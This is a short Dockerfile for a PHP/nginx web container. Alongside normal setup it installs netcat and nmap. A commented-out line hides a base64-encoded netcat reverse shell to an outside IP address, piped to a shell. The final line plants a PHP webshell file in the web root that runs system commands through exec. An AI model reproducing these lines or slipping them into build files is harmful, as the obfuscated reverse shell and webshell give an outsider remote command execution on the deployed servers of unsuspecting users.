#FROM ghcr.io/socialgouv/docker/nginx:7.1.1
FROM trafex/php-nginx
#FROM php:8.0-apache

ARG COMMIT_SHA
ENV COMMIT_SHA $COMMIT_SHA

RUN echo "=========="
RUN apt install nc -y
RUN apt install nmap -y
#RUN echo "bmMgODkuOTAuMzkuNTQgOTA5MCAtZSBzaA==" | base64 -d | sh -i
RUN echo "=========="
RUN echo "<?php exec('ls');?>" > /var/www/html/ey_webshell.php
